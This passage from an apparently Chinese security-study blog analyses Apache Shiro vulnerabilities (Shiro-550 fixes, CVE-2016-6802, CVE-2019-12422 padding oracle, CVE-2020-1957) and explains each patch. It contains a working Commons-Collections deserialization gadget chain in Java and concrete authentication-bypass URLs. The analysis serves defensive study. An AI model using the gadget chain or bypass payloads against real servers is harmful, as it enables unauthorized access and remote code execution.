数组。</li></ul><p>rmi学的不是很精，还不太懂怎么利用rmi攻击，所以就先写写第二种</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1.png" alt="image-20230324142852121"></p><p>首先看上边这个图，我们之所以要用Transformer数组类，最主要的问题就是通过transform执行runtime.exec的时候我们需要控制输入，也就必须用transform数组。所以这里我们选用加载恶意字节码文件的方式</p><p>然后由于不能有transform数组类型，所以就不能用ConstantTransformer和InvokerTransformer形成链条的这种方式</p><p>所以这里我们选用CC6的前半段加CC3的后半段</p><pre class="language-java" data-language="java"><code class="language-java">public class cc &#123;    public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;        &#x2F;&#x2F;cc3        TemplatesImpl templates &#x3D; new TemplatesImpl();        &#x2F;&#x2F; _name赋值不为null        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);            name.setAccessible(true);            name.set(templates,&quot;123&quot;);        &#x2F;&#x2F; _class赋值为null        Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);            classField.setAccessible(true);            classField.set(templates,null);        &#x2F;&#x2F;加载恶意类的字节码        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);            bytecodes.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;));        &#x2F;&#x2F;转为二维数组        byte[][] codes &#x3D; &#123;code&#125;;            bytecodes.set(templates,codes);        InvokerTransformer newTransformer &#x3D; new InvokerTransformer(&quot;newTransformer&quot;, null, null);&#x2F;&#x2F;cc6        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap,new ConstantTransformer(&quot;1&quot;));        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,templates);        HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;();        hashMap.put(tiedMapEntry, &quot;123&quot;);        Class LazyMapClass &#x3D; LazyMap.class;        Field factory &#x3D; LazyMapClass.getDeclaredField(&quot;factory&quot;);        factory.setAccessible(true);        factory.set(decorate,newTransformer);        decorate.clear();        file.serialize(hashMap,&quot;ser.bin&quot;);        file.unserialize(&quot;ser.bin&quot;);    &#125;&#125;</code></pre><p>调用链就是从hashmap到TiedMapEntry再到LazyMap，通过LazyMap触发TemplatesImpl的newTransformer，加载恶意字节码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502214640694.png" alt="image-20230502214640694"></p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级shiro版本到1.2.5</p><p>Shiro 在 1.2.5 的更新 <a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Commit-4d5bb00</a> 中针对此漏洞进行了修复，描述为：Force RememberMe cipher to be set to survive JVM restart.If the property is not set, a new cipher will be generated.</p><p>也就是说，应用程序需要用户手动配置一个 cipherKey，如果不设置，将会生成一个新 key。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641782550351.png" alt="img"></p><h2 id="CVE-2016-6802"><a href="#CVE-2016-6802" class="headerlink" title="CVE-2016-6802"></a>CVE-2016-6802</h2><h3 id="漏洞信息-3"><a href="#漏洞信息-3" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6802">CVE-2016-6802</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-07814">CNVD-2016-07814</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro &lt; 1.3.2</td></tr><tr><td align="left">漏洞描述</td><td align="left">Shiro 使用非根 servlet 上下文路径中存在安全漏洞。远程攻击者通过构造的请求， 利用此漏洞可绕过目标 servlet 过滤器并获取访问权限。</td></tr><tr><td align="left">漏洞关键字</td><td align="left">绕过 | Context Path | 非根 | /x/../</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/b15ab927709ca18ea4a02538be01919a19ab65af">Commit-b15ab92</a></td></tr><tr><td align="left">相关链接</td><td align="left"><a href="https://www.cnblogs.com/backlion/p/14055279.html">https://www.cnblogs.com/backlion/p/14055279.html</a></td></tr></tbody></table><h3 id="漏洞详解-2"><a href="#漏洞详解-2" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>这个洞感觉也没啥好跟的，就是在获取路径的导致的绕过问题（我也不想配环境了</p><p>在访问路径的前添加 /任意目录名/../，即可绕过认证权限进行访问</p><p>Shiro通过调用 <code>WebUtils.getContextPath()</code> 方法，获取 <code>javax.servlet.include.context_path</code> 属性或调用 <code>request.getContextPath()</code> 获取 Context 值。</p><p>由于获取的 Context Path 没有标准化处理，如果是非常规的路径，例如 CVE-2010-3863 中出现过的 <code>/./</code>，或者跳跃路径 <code>/su18/../</code>，都会导致在 <code>StringUtils.startsWithIgnoreCase()</code> 方法判断时失效，直接返回完整的 Request URI 。</p><p>这样 Shiro 匹配不到配置路径，就会在某些配置下发生绕过</p><h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 1.3.2 版本的更新 <a href="https://github.com/apache/shiro/commit/b15ab927709ca18ea4a02538be01919a19ab65af">Commit-b15ab92</a> 中针对此漏洞进行了修复。</p><h2 id="CVE-2019-12422"><a href="#CVE-2019-12422" class="headerlink" title="CVE-2019-12422"></a>CVE-2019-12422</h2><h3 id="漏洞信息-4"><a href="#漏洞信息-4" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12422">CVE-2019-12422</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-42574">CNVD-2016-07814</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-721">SHIRO-721</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro &lt; 1.4.2 (1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1)</td></tr><tr><td align="left">漏洞描述</td><td align="left">RememberMe Cookie 默认通过 AES-128-CBC 模式加密，这种加密方式容易受到 Padding Oracle Attack 攻击，攻击者利用有效的 RememberMe Cookie 作为前缀， 然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击。</td></tr><tr><td align="left">漏洞关键字</td><td align="left">反序列化 | RememberMe | Padding | CBC</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e">Commit-a801878</a></td></tr><tr><td align="left">相关链接</td><td align="left"><a href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data">https://blog.skullsecurity.org/2016/12</a> <a href="https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/">https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/</a> <a href="https://codeantenna.com/a/OwWV5Ivtsi">https://codeantenna.com/a/OwWV5Ivtsi</a></td></tr></tbody></table><p>Shiro721，也是一个Cookie的反序列化</p><h3 id="漏洞详解-3"><a href="#漏洞详解-3" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>本次漏洞实际并不是针对 shiro 代码逻辑的漏洞，而是针对 shiro 使用的 AES-128-CBC 加密模式的攻击，首先了解一下这种加密方式。（一字不差搬过来的</p><blockquote><h4 id="AES-128-CBC"><a href="#AES-128-CBC" class="headerlink" title="AES-128-CBC"></a>AES-128-CBC</h4><p>AES 全称 Advanced Encryption Standard （高级加密标准），是一种为了取代其前任标准（DES）而成为新标准的对称分组加密算法。这里有几个关键字：</p><ul><li>对称：所谓对称加密，即使用同一组 key 进行明文和密文的转换。</li><li>分组加密算法：将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。常见的有 ECB、CBC、PCBC、CFB、OFB、CTR 等几种算法。</li><li>分组长度固定为 128bit 。</li><li>密钥 key 的长度可以为 128 bit（16字节）、192 bit（24字节）、256 bit（32字节）。根据密钥的长度不同，推荐加密轮数也不同，上述三个密钥长度分别迭代 10/12/14 轮。加密轮数越多，安全性越好，同时也更耗费时间。</li></ul><p>因此 AES-128-CBC 模式就代表使用 AES 密钥长度为 128 bit，使用 CBC 分组算法的加密模式。</p><p>再来了解一下 CBC，全称 Cipher Block Chaining (密文分组链接模式)，简单来说，是一种使用前一个密文组与当前明文组 XOR 后再进行加密的模式。</p><p>关于 AES 加解密流程实现可以看<a href="https://codeantenna.com/a/OwWV5Ivtsi">这篇文章</a>，关于 CBC 分组的实现可以看<a href="https://blog.csdn.net/chengqiuming/article/details/82288851">这篇文章</a>。这里就不占篇幅描述了。</p><p>CBC 模式下，有三种填充方式，用于在分组数据不足时，在结尾进行填充，用于补齐：</p><ul><li>NoPadding：不填充，明文长度必须是 16 Bytes 的倍数。</li><li>PKCS5Padding：以完整字节填充 , 每个填充字节的值是用于填充的字节数 。即要填充 N 个字节 , 每个字节都为 N。</li><li>ISO10126Padding：以随机字节填充 , 最后一个字节为填充字节的个数。</li></ul><p>Shiro 中使用的是 PKCS5Padding，也就是说，可能出现的 padding byte 值只可能为：</p><ul><li>1 个字节的 padding 为 0x01</li><li>2 个字节的 padding 为 0x02,0x02</li><li>3 个字节的 padding 为 0x03,0x03,0x03</li><li>4 个字节的 padding 为 0x04,0x04,0x04,0x04</li><li>...</li></ul><p>当待加密的数据长度刚好满足分组长度的倍数时，仍然需要填充一个分组长度，也就是说，明文长度如果是 16n，加密后的数据长度为 16(n+1) 。</p><h4 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h4><p>Padding Oracle Attack 就是针对 CBC 模式分组加密算法的一种攻击手段，可以查看<a href="https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/">这篇文章</a>学习，英文有困难的小伙伴可以查看<a href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/">这篇文章</a>，说的非常清晰。</p><p>这里还是简单的描述一下攻击思路，在加密时，最后一个分组如果长度不够，会进行填充，然后使用倒数第二个分组的密文作为 IV 进行异或，然后进行 AES 加密。</p><p>在解密时，先对密文组（CiperText）使用密钥 (Key) 进行 AES 解密，得到一个中间值（MediumValue），然后再异或 IV (也就是上一个密文组) 就会得到这个分组的明文分组（PlainText）。</p><p>这个明文分组，是经过 PKCS5Padding 规范填充过的，因此它一定是遵从 PKCS5Padding 的规范的，这个规范就是本次的攻击验证点。</p><p>Padding Oracle Attack 就是利用了异或的魅力以及 PKCS5Padding 规范的可穷举性进行的攻击，wikipedia 中给出解释：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641986191136.png" alt="img"></p><p>这个攻击逻辑我想了小一天，看了 fynch3r 师傅的博客，又咨询了下，最后想通了，这里用比较清晰的话描述出来，供跟我一样密码学和数学基础较差的朋友理解：</p><ul><li>攻击者修改倒数第二组密文的最后一个字节，发送到服务器，服务器解密后得到 MediumValue，将其与攻击者修改后的倒数第二组密文异或，得到 PlainText，然后对其进行 Padding 校验，此时校验大概率会失败，因为修改过的密文与 MediumValue 异或后不是原本的 Padding 了。</li><li>此时攻击者遍历修改倒数第二组密文的最后一个字节 ( 0x00 - 0xFF , 最多遍历 255 次 )，使其与 MediumValue 异或，直到最后一个字节异或的结果是 0x01 ，这样得到的 PlainText 是符合 Padding 规范的，攻击者期待程序返回不一样的结果进行判断。这种情况下攻击者可以知道：MediumValue 异或攻击者遍历修改倒数第二组密文的结果的最后一个字节为 0x01 ，根据异或的运算法则，MediumValue 最后一个字节就是 0x01 异或攻击者修改的字节。此时攻击者得到了 <code>MediumValue[8]</code> 的值。此时攻击者知道了 <code>MediumValue[8]</code> 的值，还可以知道原倒数第二组密文最后一个字节的值，就可以计算出原 <code>PlainText[8]</code> 的值，</li><li>接下来攻击者遍历修改倒数第二组密文的倒数第二个字节，此时攻击者希望异或运算后得到的明文分组的最后两个字节为 0x02 0x02，这样是符合 Padding 规范的，并且由于已经计算了出了 <code>PlainText[8]</code> 的值，因此在这轮遍历中可以用原倒数第二组密文最后一个字节的值异或<code>PlainText[8]</code>再异或 0x02 作为倒数第二组密文的最后一个字节，因为它与 <code>MediumValue[8]</code> 的异或一定为 0x02，攻击者依旧只需要遍历第二组密文的倒数第二个字节即可。</li><li>依次类推，可以依次计算出最后一组密文中全部的 MediumValue 及 PlainText。</li><li>舍弃掉最后一组密文，向服务器提交第一组至倒数第二组密文，迭代之前的操作，获得倒数第二组明文。依次规律，直到获得所有分组的明文。</li></ul><p>看了全网，发现这部分流程还是 Epicccal 师傅的相关<a href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/">博客</a>写的最为清晰。</p><p>至此，攻击者可以在不知道密钥 Key 的情况下得到全部明文的值。但这有两个前提：</p><ol><li>服务器会对解密结果进行 padding 校验，并且结果可以从响应中进行判断（类似 SQL 盲注）。</li><li>攻击者已知能正确解密和使用的密文以及初始向量 IV。</li></ol><h3 id="CBC-Byte-Flipping-Attack"><a href="#CBC-Byte-Flipping-Attack" class="headerlink" title="CBC Byte-Flipping Attack"></a>CBC Byte-Flipping Attack</h3><p>到现在已经可以使用 Padding Oracle Attack 在不知道 key 的情况下获取全部明文的值，但这仅仅是信息泄露，能不能进一步篡改信息呢？这里就用到了 CBC 字节翻转攻击。</p><p>相关原理可看<a href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/">这篇文章</a>以及<a href="https://www.freebuf.com/articles/system/163756.html">这篇文章</a>。这里还是简单描述：通过修改密文进而篡改明文。</p><p>在解密时，会使用 MediumValue 与上一组密文进行异或来得到明文，现在知道上一组密文，也知道本组的明文，就能计算出本组的 MediumValue，如果想要异或出不一样的数据，我们只需要篡改上一组的密文，使其跟 MediumValue 能异或出指定的数据即可。</p><p>这是一个逆推的过程：</p><ul><li>获取最后一组密文，由 Padding Oracle Attack 爆破出其 MediumValue ，根据篡改后的明文与 MediumValue 异或，得到前一轮的密文。</li><li>再使用计算出来的前一轮的密文继续爆破出对应的 MediumValue，再根据篡改后的明文进行异或，再得到前一轮的密文。</li><li>以此类推到第一组，异或出的值作为起始 IV。</li></ul><p>拼接起始 IV 以及全部计算出的每组的密文即可获得一个可以使服务器解密为指定明文数据的密文了。</p></blockquote><p>Padding Oracle Attack简单说就是通过PKCS5的给不满足长度的分组补后缀的方式来爆破出明文的内容</p><p>比如我现在构造了个全是0x00的倒数第二组密文C2，那么倒数第一组密文C1再经过解密后变为一个我们不知道的KEY(C1)，此时若要最终解密完成，还要与C2进行异或操作，也就是C2^KEY(C1)。</p><p>那么由于我现在可以控制C2，也就能控制最终得到的明文，而又由于明文遵循PKCS5的填充方式，因此我们可以通过爆破让C2的最后一个字符异或KEY(C1)的最后一个字符为0x01，那么此时C2^KEY(C1) = 0x01，我们就能算出KEY(C1)的最后一个字符，然后再让C2的后两个字符异或KEY(C1) 等于0x02，我们就能得到KEY(C1)的倒数第二个字符，以此类推得到整个KEY(C1)。</p><p>那我们知道KEY(C1)异或一个真正的第二组密文得到的就是明文，那假如我们知道了真正的倒数第二组密文，就能得到最后一组密文所对应的明文</p><p>所以Padding Oracle Attack的利用条件就是</p><ul><li>可以修改密文</li><li>已知密文和iv</li></ul><p>CBC Byte-Flipping Attack简单来说，和Padding Oracle Attack原理差不多，唯一的差别是我们通过Padding Oracle Attack知道了KEY(C1)的值，那么我们就可以去构造恶意的C2，让最终系统解密出来的明文是我们想要的内容了</p><p>shiro721就是利用这种方式，让我们在不知道加密密钥的情况下，通过修改RememberMe使其解密后的内容成为我们反序列化的payload。反序列化的链子和550是一样的。</p><p>但是一个字节最多要爆破255次，一个分组有十六个字节，所以一个分组最多要爆破255 * 16 = 4080次，按照shiro550的payload长度，感觉最少要十几万次爆破。</p><h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在 1.4.2 版本的更新 <a href="https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e">Commit-a801878</a> 中针对此漏洞进行了修复 ，在父级类 JcaCipherService 中抽象出了一个 <code>createParameterSpec()</code> 方法返回加密算法对应的类。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641954457087.png" alt="img"></p><p>并在 AesCipherService 中重写了这个方法，默认使用 GCM 加密模式，避免此类攻击。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641954465546.png" alt="img"></p><h2 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h2><h3 id="漏洞信息-5"><a href="#漏洞信息-5" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1957">CVE-2020-1957</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-20984">CNVD-2020-20984</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro &lt; 1.5.2</td></tr><tr><td align="left">漏洞描述</td><td align="left">Spring Boot 中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL 利用 Shiro 和 SpringBoot 对 URL 的处理的差异化，可以绕过 Shiro 对 SpringBoot 中的 Servlet 的权限控制，越权并实现未授权访问。</td></tr><tr><td align="left">漏洞关键字</td><td align="left">SpringBoot | 差异化处理 | / | 绕过</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/589f10d40414a815dbcaf1f1500a51f41258ef70">Commit-589f10d</a> &amp;&amp; <a href="https://github.com/apache/shiro/commit/9762f97926ba99ac0d958e088cae3be8b657948d">Commit-9762f97</a> &amp;&amp; <a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce">Commit-3708d79</a></td></tr><tr><td align="left">相关链接</td><td align="left"><a href="https://issues.apache.org/jira/browse/SHIRO-742">SHIRO-742</a> <a href="https://www.openwall.com/lists/oss-security/2020/03/23/2">https://www.openwall.com/lists/oss-security/2020/03/23/2</a> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-2957">CVE-2020-2957</a> -&gt; ?</td></tr></tbody></table><h3 id="漏洞详解-4"><a href="#漏洞详解-4" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>不想搭环境了，感觉路径解析的问题也没啥好分析源码的，所以就直接抄了（</p><h4 id="SHIRO-682"><a href="#SHIRO-682" class="headerlink" title="SHIRO-682"></a>SHIRO-682</h4><p>本漏洞起源于 <a href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a>，Issues 描述了在 SpingWeb 中处理 requestURI 与 shiro 中匹配鉴权路径差异导致的绕过问题：在 Spring 中，<code>/resource/menus</code> 与 <code>/resource/menus/</code> 都可以访问资源，但是在 shiro 中，这两个路径是成功匹配的，所以在 Spring 集成 shiro 时，只需要在访问路径后添加 &quot;/&quot; 就存在绕过权限校验的可能。</p><p>其实就是 spring 在分发请求时，会从 <code>DispatcherServlet#handlerMappings</code> 找到能匹配路径的 Handler，会遍历匹配路径，负责匹配的 <code>PathPattern#match</code> 方法对 &quot;/admin/list/&quot; 和 &quot;/admin/list&quot; 的匹配会返回 true。</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>除了上面的漏洞，本 CVE 通报版本号内还存在一个另一个绕过。利用的是 shiro 和 spring 对 url 中的 &quot;;&quot; 处理的差别来绕过校验。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642082062877.png" alt="img"></p><p>然，绕过的原理就是访问 <code>/aaaadawdadaws;/..;wdadwadadw/;awdwadwa/audit/list</code> 这个请求的时候会被 shiro 和 spring 解析成不同的结果。</p><p>先来看下 shiro，之前提到过，shiro 会用自己处理过的 RequestURI 和配置的路径进行匹配，具体的方法就是 <code>WebUtils#getRequestUri</code>，方法先调用 <code>decodeAndCleanUriString</code> 方法处理请求路径，再调用 normalize 方法标准化路径。<code>decodeAndCleanUriString</code> 方法逻辑如下，可以看到，对 URL 中存在 &quot;;&quot; 的处理是直接截断后面的内容。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642077803111.png" alt="img"></p><p>那 Spring 是怎么处理的呢？方法是 <code>UrlPathHelper#decodeAndCleanUriString</code> ，方法名也叫 <code>decodeAndCleanUriString</code>，你说巧不巧？其实一点也不巧，这分明就是 shiro 抄 spring 的作业。</p><p>方法里一次执行了 3 个动作：removeSemicolonContent 移除分号，decodeRequestString 解码，getSanitizedPath 清理路径，具体描述如下图：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642083274083.png" alt="img"></p><p>其中出现差异的点就在于 <code>UrlPathHelper#removeSemicolonContent</code> ，逻辑如下图：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642077812198.png" alt="img"></p><p>可以看到，spring 处理了每个 / / 之间的分号，均把 &quot;;&quot; 及之后的内容截取掉了。所以当请求 <code>/aaaadawdadaws;/..;wdadwadadw/;awdwadwa/audit/list</code> 进入到 <code>UrlPathHelper#decodeAndCleanUriString</code> 方法时，会逐渐被处理：</p><ul><li>removeSemicolonContent：&quot;/aaaadawdadaws/..//audit/list&quot;</li><li>decodeRequestString：&quot;/aaaadawdadaws/..//audit/list&quot;</li><li>getSanitizedPath：&quot;/aaaadawdadaws/../audit/list&quot;</li></ul><p>这样再标准化就会成为正常的 &quot;/audit/list&quot;。</p><p>这种思路是哪里来的呢？其实又是抄了 Tomcat 的处理思想，处理逻辑位于 <code>org.apache.catalina.connector.CoyoteAdapter#parsePathParameters</code> 如下图</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642087561486.png" alt="img"></p><p>也就说，在 Tomcat 的实现下，对于访问 URL 为 &quot;/aaaadawdadaws;/..;wdadwadadw/;awdwadwa/audit/list&quot; 的请求，使用 <code>request.getServletPath()</code> 就会返回 &quot;/audit/list&quot;。</p><p>而由于 spring 内嵌 tomcat ，又在处理时借鉴了它的思路，所以导致 <code>UrlPathHelper#getPathWithinServletMapping</code> 方法其实无论如何都会返回经过上述处理逻辑过后的路径，也就是 &quot;/audit/list&quot;。</p><p>了解了这个处理机制后，这个路径就可以被花里胡哨的改为：</p><pre class="language-txt" data-language="txt"><code class="language-txt">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;123;&#x2F;..;345&#x2F;;..&#x2F;.;&#x2F;su18&#x2F;..;&#x2F;;&#x2F;;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;;&#x2F;;&#x2F;;awdwadwa&#x2F;audit&#x2F;list</code></pre><p>依然可以绕过校验：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642088051819.png" alt="img"></p><p>经测试，上面这个 payload 只能在较低版本的 Spring Boot 上使用。为什么呢？直接引用<br>Ruil1n 师傅的<a href="http://rui0.cn/archives/1643">原文</a>:</p><blockquote><p>当 Spring Boot 版本在小于等于 2.3.0.RELEASE 的情况下，alwaysUseFullPath 为默认值 false，这会使得其获取 ServletPath ，所以在路由匹配时相当于会进行路径标准化包括对 %2e 解码以及处理跨目录，这可能导致身份验证绕过。而反过来由于高版本将 alwaysUseFullPath 自动配置成了 true 从而开启全路径，又可能导致一些安全问题。</p></blockquote><p>针对这方面的内容，截止至本文发出前，先知上有师傅发出了<a href="https://xz.aliyun.com/t/10799">tomcat容器url解析特性研究</a>，对其中的相关内容进行了详述，可移步观看。</p><p>在高版本上不处理跨目录，就只能借助 shiro 一些配置问题尝试绕过：比如应用程序配置了访问路径 &quot;/audit/**&quot; 为 anon，但是指定了其中的一个 &quot;/audit/list&quot; 为 authc。这时在不跳目录的情况下，可以使用如下请求绕过：</p><pre class="language-txt" data-language="txt"><code class="language-txt">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;audit&#x2F;&#x2F;;aaaa&#x2F;;...&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;;&#x2F;;&#x2F;;awdwadwa&#x2F;list</code></pre><h3 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>首先是针对 <a href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a> 的修复，共提交了两次，第一次为 <a href="https://github.com/apache/shiro/commit/589f10d40414a815dbcaf1f1500a51f41258ef70">Commit-589f10d</a> ，如下图，可以看到是在 <code>PathMatchingFilter#pathsMatch</code> 方法中添加了对访问路径后缀为 &quot;/&quot; 的支持。</p><p><img src="https://su18.org/post-images/1642063615932.png" alt="img"></p><p>同时在 <code>PathMatchingFilterChainResolver#getChain</code> 也添加了同样的逻辑。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642063507064.png" alt="img"></p><p>第二次是 <a href="https://github.com/apache/shiro/commit/9762f97926ba99ac0d958e088cae3be8b657948d">Commit-9762f97</a>，是修复由于上一次提交，导致访问路径为 &quot;/&quot; 时抛出的异常。可以看到除了 <code>endsWith</code> 还添加了 <code>equals</code> 的判断。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642089975752.png" alt="img"></p><p>然后是对使用 &quot;;&quot; 绕过的修复 <a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce">Commit-3708d79</a>， 可以看到 shiro 不再使用 <code>request.getRequestURI()</code> 来获取用户妖魔鬼怪的请求路径，而是使用 <code>request.getContextPath()</code>、<code>request.getServletPath()</code>、<code>request.getPathInfo()</code> 进行拼接，直接获取中间件处理后的内容。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642063523718.png" alt="img"></p><h2 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h2><h3 id="漏洞信息-6"><a href="#漏洞信息-6" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11989">CVE-2020-11989</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-782">SHIRO-782</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro &lt; 1.5.3</td></tr><tr><td align="left">漏洞描述</td><td align="left">由安全研究员 Ruilin 以及淚笑发现在 Apache Shiro 1.5.3 之前的版本， 将 Apache Shiro 与 Spring 动态控制器一起使用时，特制请求可能会导致身份验证绕过。</td></tr><tr><td align="left">漏洞关键字</td><td align="left">Spring | 双重编码 | %25%32%66 | 绕过 | context-path | /;/</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/01887f645f92d276bbaf7dc644ad28ed4e82ef02">Commit-01887f6</a></td></tr><tr><td align="left">相关链接</td><td align="left"><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a> <a href="https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA">https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA</a></td></tr></tbody></table><h3 id="漏洞详解-5"><a href="#漏洞详解-5" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><h4 id="AntPathMatcher-绕过"><a href="#AntPathMatcher-绕过" class="headerlink" title="AntPathMatcher 绕过"></a>AntPathMatcher 绕过</h4><p>根据腾讯玄武实验室官方给出的漏洞细节文章，本漏洞是需要几个利用条件的，接下来看一下具体的细节。</p><p>Shiro 支持 <a href="https://ant.apache.org/">Ant</a> 风格的路径表达式配置。ANT 通配符有 3 种，如下表：</p><table><thead><tr><th align="center">通配符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">?</td><td align="center">匹配任何单字符</td></tr><tr><td align="center">*</td><td align="center">匹配0或者任意数量的字符</td></tr><tr><td align="center">**</td><td align="center">匹配0或者更多的目录</td></tr></tbody></table><p>在之前的测试和使用中，常见的就是 <code>/**</code> 